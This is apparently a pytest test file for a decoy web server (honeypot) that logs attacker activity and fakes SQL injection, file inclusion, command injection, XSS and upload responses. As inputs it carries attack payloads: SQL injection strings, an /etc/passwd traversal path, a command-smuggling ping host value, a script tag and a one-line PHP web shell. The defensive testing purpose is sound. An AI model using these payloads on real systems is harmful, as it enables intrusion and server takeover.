"""Tests de las rutas señuelo con TestClient. Cada ruta debe generar una línea JSON válida."""
from __future__ import annotations

import hashlib
import json
import stat
import uuid
from pathlib import Path

import pytest

from tests.conftest import WEAK_PASS, WEAK_USER, Honeypot
from tests.schema import validate_event

GET_ROUTES = [
    "/", "/index.php", "/login", "/admin", "/wp-login.php", "/phpmyadmin/", "/search", "/search?q=ana",
    "/view", "/view?file=about.txt", "/ping", "/ping?host=127.0.0.1", "/comment", "/upload",
    "/robots.txt", "/.env", "/.git/config", "/backup.zip", "/server-status", "/panel", "/no-existe",
]


@pytest.mark.parametrize("url", GET_ROUTES)
def test_every_route_logs_one_valid_event(hp: Honeypot, url: str) -> None:
    resp = hp.client.get(url, headers={"User-Agent": "Nikto/2.1.6"})
    events = hp.events()
    assert len(events) == 1, "una petición = una línea"
    ev = events[0]
    assert validate_event(ev) == [], validate_event(ev)
    assert ev["http"]["status"] == resp.status_code
    assert ev["http"]["user_agent"] == "Nikto/2.1.6"
    assert ev["src_ip"] == "203.0.113.5" and ev["src_port"] == 51234 and ev["dst_port"] == 8080
    assert ev["http"]["method"] == "GET" and ev["event_type"] == "request"


def test_server_headers_and_no_framework_leaks(hp: Honeypot) -> None:
    r = hp.client.get("/")
    assert r.headers["server"] == "Apache/2.4.41 (Ubuntu)" and r.headers["x-powered-by"].startswith("PHP/")
    for leak in ("/docs", "/redoc", "/openapi.json"):
        assert hp.client.get(leak).status_code == 404


def test_404_and_405_look_like_apache(hp: Honeypot) -> None:
    r = hp.client.get("/nada<script>")
    assert r.status_code == 404 and "The requested URL /nada&lt;script&gt; was not found" in r.text
    assert "Apache/2.4.41 (Ubuntu) Server at intranet.test Port 8080" in r.text
    r = hp.client.delete("/login")
    assert r.status_code == 405 and "Method Not Allowed" in r.text


@pytest.mark.parametrize(
    "path,data",
    [
        ("/login", {"username": "root", "password": "toor"}),
        ("/admin", {"username": "root", "password": "toor"}),
        ("/wp-login.php", {"log": "root", "pwd": "toor"}),
        ("/phpmyadmin/", {"pma_username": "root", "pma_password": "toor"}),
    ],
)
def test_fake_logins_always_fail(hp: Honeypot, path: str, data: dict[str, str]) -> None:
    r = hp.client.post(path, data=data)
    assert r.status_code == 200
    ev = hp.last()
    assert validate_event(ev) == []
    assert ev["event_type"] == "auth_attempt"
    assert ev["auth"] == {"username": "root", "password": "toor", "success": False}
    assert ev["http"]["body"] and "toor" in ev["http"]["body"]


def test_login_via_query_and_basic_auth_are_logged(hp: Honeypot) -> None:
    hp.client.get("/login?user=bob&pass=hunter2")
    assert hp.last()["auth"]["username"] == "bob"
    r = hp.client.get("/admin", auth=("alice", "pw"))
    assert r.status_code == 401 and "WWW-Authenticate" in r.headers
    assert hp.last()["event_type"] == "auth_attempt" and hp.last()["auth"]["username"] == "alice"


def test_weak_credential_enters_fake_panel(hp: Honeypot) -> None:
    assert hp.client.get("/panel").status_code == 302  # sin sesión
    r = hp.client.post("/login", data={"username": WEAK_USER, "password": WEAK_PASS})
    assert r.status_code == 302 and r.headers["location"] == "/panel"
    sid = r.cookies.get("PHPSESSID")
    assert sid and hp.last()["auth"]["success"] is True and hp.last()["session_id"] == sid
    panel = hp.client.get("/panel", cookies={"PHPSESSID": sid})
    assert panel.status_code == 200 and "Panel de administracion" in panel.text
    assert hp.last()["session_id"] == sid  # el resto de la sesión queda correlacionada
    forged = hp.client.get("/panel", cookies={"PHPSESSID": "deadbeef"})
    assert forged.status_code == 302


def test_weak_credential_disabled_when_empty(make_hp) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp(weak_pass="")
    r = hp.client.post("/login", data={"username": "admin", "password": ""})
    assert r.status_code == 200 and hp.last()["auth"]["success"] is False


def test_sqli_simulation(hp: Honeypot) -> None:
    r = hp.client.get("/search", params={"q": "'"})
    assert "You have an error in your SQL syntax" in r.text
    r = hp.client.get("/search", params={"q": "' OR 1=1-- -"})
    assert "password_hash" in r.text and "21232f297a57a5a743894a0e4a801fc3" in r.text
    r = hp.client.get("/search", params={"q": "x' UNION SELECT 1,version(),database()-- -"})
    assert "8.0.32-0ubuntu0.20.04.2" in r.text
    r = hp.client.get("/search", params={"q": "x' UNION SELECT 1,2-- -"})
    assert "different number of columns" in r.text
    assert hp.last()["http"]["query"] == "q=x' UNION SELECT 1,2-- -"
    assert hp.last()["event_type"] == "request"  # el módulo B no clasifica


def test_lfi_simulation_never_reads_real_files(hp: Honeypot, tmp_path: Path) -> None:
    real = tmp_path / "real.txt"
    real.write_text("CONTENIDO-REAL-DEL-HOST")
    assert "root:x:0:0:" in hp.client.get("/view", params={"file": "../../../../etc/passwd"}).text
    r = hp.client.get("/view", params={"file": str(real)})
    assert "CONTENIDO-REAL-DEL-HOST" not in r.text and "failed to open stream" in r.text
    assert "Permission denied" in hp.client.get("/view", params={"file": "/etc/shadow"}).text
    r = hp.client.get("/view", params={"file": "http://evil.example/s.txt"})
    assert "allow_url_include=0" in r.text


def test_command_injection_simulation_executes_nothing(hp: Honeypot, tmp_path: Path) -> None:
    marker = tmp_path / "pwned"
    r = hp.client.get("/ping", params={"host": f"127.0.0.1; id; touch {marker}"})
    assert "uid=33(www-data)" in r.text and "bytes of data" in r.text
    assert not marker.exists()
    assert "www-data" in hp.client.get("/ping", params={"host": "x && whoami || whoami"}).text


def test_xss_is_reflected_only_to_requester_and_never_stored(hp: Honeypot) -> None:
    payload = "<script>alert(1)</script>"
    r = hp.client.post("/comment", data={"name": "mallory", "comment": payload})
    assert payload in r.text and r.headers["x-xss-protection"] == "0"
    again = hp.client.get("/comment")
    other = hp.client.get("/comment", headers={"X-Forwarded-For": "198.51.100.77"})
    assert payload not in again.text and payload not in other.text
    assert payload not in hp.client.get("/").text


def test_comment_csp_is_optional(make_hp) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp(comment_csp="default-src 'none'")
    assert hp.client.get("/comment?comment=x").headers["content-security-policy"] == "default-src 'none'"


def test_upload_is_stored_isolated_and_logged(hp: Honeypot) -> None:
    content = b"<?php system($_GET['c']); ?>"
    r = hp.client.post("/upload", files={"file": ("shell.php", content, "application/x-php")})
    assert r.status_code == 200 and "/uploads/" in r.text and "shell.php" in r.text
    ev = hp.last()
    assert validate_event(ev) == []
    assert ev["event_type"] == "file_upload"
    assert ev["file"] == {"name": "shell.php", "sha256": hashlib.sha256(content).hexdigest(), "size": len(content), "url": None}
    (stored,) = hp.uploads()
    assert stored.read_bytes() == content
    assert stored.name != "shell.php" and "." not in stored.name              # nombre aleatorio
    assert stat.S_IMODE(stored.stat().st_mode) & 0o111 == 0                    # sin permisos de ejecución
    assert stored.name not in r.text                                           # no se revela el nombre real
    assert hp.client.get("/uploads/x/shell.php").status_code == 404            # nunca se sirve
    assert hp.client.get(f"/uploads/{stored.name}").status_code == 404


def test_upload_traversal_filename_does_not_escape_directory(hp: Honeypot, tmp_path: Path) -> None:
    hp.client.post("/upload", files={"file": ("../../evil.php", b"x", "text/plain")})
    assert hp.last()["file"]["name"] == "../../evil.php"                       # se registra tal cual
    assert not list(tmp_path.rglob("evil.php"))                                # pero nunca se usa como ruta


def test_upload_limits(make_hp) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp(max_upload_bytes=1024)
    r = hp.client.post("/upload", files={"file": ("big.bin", b"A" * 5000, "application/octet-stream")})
    assert r.status_code == 413 and hp.uploads() == []
    assert hp.last()["http"]["status"] == 413
    hp = make_hp(upload_max_files=1)
    for i in range(3):
        assert hp.client.post("/upload", files={"file": (f"f{i}", b"data", "text/plain")}).status_code == 200
    assert len(hp.uploads()) == 1 and len([e for e in hp.events() if e["event_type"] == "file_upload"]) == 3


def test_upload_without_file(hp: Honeypot) -> None:
    r = hp.client.post("/upload", data={"x": "y"})
    assert r.status_code == 400 and hp.last()["event_type"] == "request"


def test_scanner_routes(hp: Honeypot) -> None:
    assert "Disallow: /admin/" in hp.client.get("/robots.txt").text
    env = hp.client.get("/.env").text
    assert "DB_PASSWORD=" in env and "AKIAIOSFODNN7EXAMPLE" in env
    assert "[remote \"origin\"]" in hp.client.get("/.git/config").text
    z = hp.client.get("/backup.zip")
    assert z.headers["content-type"] == "application/zip" and z.content.startswith(b"PK\x05\x06") and len(z.content) == 22
    assert "Apache Server Status" in hp.client.get("/server-status").text


def test_body_over_limit_gets_413_and_is_logged(hp: Honeypot) -> None:
    r = hp.client.post("/comment", content=b"A" * (hp.settings.max_body_bytes + 1), headers={"Content-Type": "text/plain"})
    assert r.status_code == 413 and hp.last()["http"]["status"] == 413


def test_big_body_is_truncated_in_log(hp: Honeypot) -> None:
    hp.client.post("/comment", data={"comment": "B" * 30_000})
    body = hp.last()["http"]["body"]
    assert len(body.encode()) <= 8192 and validate_event(hp.last()) == []


def test_rate_limit_per_ip(make_hp) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp(rate_limit_per_min=60, rate_limit_burst=5)
    codes = [hp.client.get("/").status_code for _ in range(8)]
    assert codes[:5] == [200] * 5 and set(codes[5:]) == {429}
    assert len(hp.events()) == 8 and hp.last()["http"]["status"] == 429


def test_x_forwarded_for_only_when_trusted(make_hp) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp()
    hp.client.get("/", headers={"X-Forwarded-For": "6.6.6.6, 198.51.100.9"})
    assert hp.last()["src_ip"] == "203.0.113.5"
    hp = make_hp(trust_proxy=True)
    hp.client.get("/", headers={"X-Forwarded-For": "6.6.6.6, 198.51.100.9"})
    assert hp.last()["src_ip"] == "198.51.100.9" and hp.last()["src_port"] is None


def test_ipv4_mapped_peer_is_normalized_at_asgi_boundary(make_hp) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp(peer=("::ffff:192.0.2.7", 40000))
    hp.client.get("/")
    assert hp.last()["src_ip"] == "192.0.2.7" and hp.last()["src_port"] == 40000


@pytest.mark.parametrize("trust_proxy", [False, True])
def test_other_forwarding_headers_never_replace_the_peer(make_hp, trust_proxy: bool) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp(trust_proxy=trust_proxy)
    hp.client.get("/", headers={"Forwarded": "for=6.6.6.6", "X-Real-IP": "6.6.6.6"})
    ev = hp.last()
    assert ev["src_ip"] == "203.0.113.5" and ev["src_port"] == 51234
    assert ev["http"]["headers"]["x-real-ip"] == "6.6.6.6"  # se registra como observado, no como origen


@pytest.mark.xfail(
    strict=True,
    reason="Capacidad ausente (V2 P1 web, middleware.py 38-55): TRUST_PROXY es booleano y no "
    "comprueba que el peer sea el proxy autorizado. Lo cierra la PR que añada la lista de proxies.",
)
def test_forwarded_for_from_peer_outside_authorized_proxies_is_ignored(make_hp) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp(trust_proxy=True, peer=("203.0.113.5", 51234))  # peer directo, no es un proxy
    hp.client.get("/", headers={"X-Forwarded-For": "6.6.6.6"})
    assert hp.last()["src_ip"] == "203.0.113.5"


def test_each_request_is_one_identifiable_event_with_fictitious_data(hp: Honeypot) -> None:
    r1 = hp.client.get("/search?q=laura")
    r2 = hp.client.get("/search?q=laura")
    assert r1.status_code == 200 and "Laura Gómez" in r1.text  # dato del directorio simulado
    lines = hp.log_path.read_text(encoding="utf-8").splitlines()
    assert len(lines) == 2
    events = [json.loads(line) for line in lines]
    for ev in events:
        validate_event(ev)
        assert str(uuid.UUID(ev["event_id"])) == ev["event_id"]
    assert events[0]["event_id"] != events[1]["event_id"]
    assert r2.status_code == 200


def test_logging_failure_never_takes_the_app_down(make_hp) -> None:  # type: ignore[no-untyped-def]
    hp = make_hp(log_dir="/proc/no/se/puede/escribir")  # el logger cae a stderr
    assert hp.client.get("/").status_code == 200
    assert hp.client.post("/login", data={"username": "a", "password": "b"}).status_code == 200


def test_malformed_bodies_do_not_break_routes(hp: Honeypot) -> None:
    r = hp.client.post("/login", content=b"{not json", headers={"Content-Type": "application/json"})
    assert r.status_code == 200
    r = hp.client.post("/upload", content=b"--garbage", headers={"Content-Type": "multipart/form-data; boundary=xyz"})
    assert r.status_code in (200, 400)
    assert all(validate_event(e) == [] for e in hp.events())
